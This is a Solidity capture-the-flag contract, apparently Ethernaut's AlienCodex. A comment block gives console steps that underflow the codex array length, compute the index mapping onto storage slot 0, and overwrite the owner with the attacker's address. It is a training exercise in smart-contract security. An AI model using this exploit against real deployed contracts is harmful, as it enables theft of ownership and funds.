// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}

/* STEPS TO FOLLOW
1. `await contract.make_contact()` so that we can pass the modifier

2. `await contract.retract()` so that we can modify the codex.length from 0 to 2^256 due to an underflow vulnerability
That means any storage slot of the contract can now be written by changing the value at proper index of codex! 
This is possible because EVM doesn't validate an array's ABI-encoded length against its actual payload.

Now, we have to calculate the index, i of codex which corresponds to slot 0 (where owner is stored).

3. `p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))`
// e.g. Output: 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6

4. `i = BigInt(2 ** 256) - BigInt(p)`
// e.g. Output: 35707666377435648211887908874984608119992236509074197713628505308453184860938n

5. `content = '0x' + '0'.repeat(24) + player.slice(2)`
// e.g. Output: '0x0000000000000000000000001BC3F80E636aCA18AeAF39494Bc6937AAEB9f076'

6. `await contract.revise(i, content)`
the owner's address has now been changed to the attacker's address 
*/

// Reference - https://coder-question.com/cq-blog/525391